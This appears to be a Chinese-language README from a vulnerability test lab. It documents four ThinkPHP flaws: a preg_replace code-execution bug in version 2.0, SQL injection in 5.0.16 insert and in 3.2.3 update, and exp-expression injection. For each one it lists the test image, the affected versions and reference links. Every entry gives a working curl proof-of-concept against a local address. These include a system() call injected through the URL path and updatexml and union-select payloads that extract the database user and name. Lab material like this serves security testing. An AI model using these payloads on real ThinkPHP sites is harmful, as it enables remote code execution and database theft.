## Thinkphp preg_replace 代码执行漏洞

测试镜像

* src/thinkphp/2.0/

说明

* 当 `URL_PATHINFO_MODEL` 设置为 `1` 时存在代码执行漏洞

Poc

```
curl -g 'http://127.0.0.1/index.php/module/action/param1/$%7B@system($_POST[0])%7D' -d 0=ls
```



## Thinkphp 5.0.16 insert 注入漏洞

测试镜像

* src/thinkphp/5.0.16/

影响版本

- Thinkphp < 5.0.16

参考文档

* [ThinkPHP框架 5.0.x sql注入漏洞分析](https://paper.seebug.org/564/)

Poc

```
curl '127.0.0.1/public/index.php/index/index/testsql?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1
```



## Thinkphp3.2.3 update注入漏洞

测试镜像

- src/thinkphp/3.2.3/

影响版本

- Thinkphp < 3.2.3

参考链接

- [Thinkphp3.2.3最新版update注入漏洞](https://paper.seebug.org/573/)

Poc

```shell
curl 'http://172.17.0.2/index.php/home/user?user\[0\]=bind&user\[1\]=money_0%20or%201%20and(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))&money=qwe'
```

返回内容包含sql报错：XPATH syntax error: '~root@localhost~'



## Thinkphp exp表达式注入漏洞

测试镜像

- src/thinkphp/3.2.3/

影响版本

- Thinkphp 3.x 5.x

参考文档

- [ThinkPHP框架架构上存在SQL注入](https://www.secpulse.com/archives/29826.html)

Poc

```shell
curl 'http://172.17.0.2/index.php/home/user/exp_inject?id\[\]=exp&id\[\]=%3d888%20union%20select%201,database(),3%23'
```

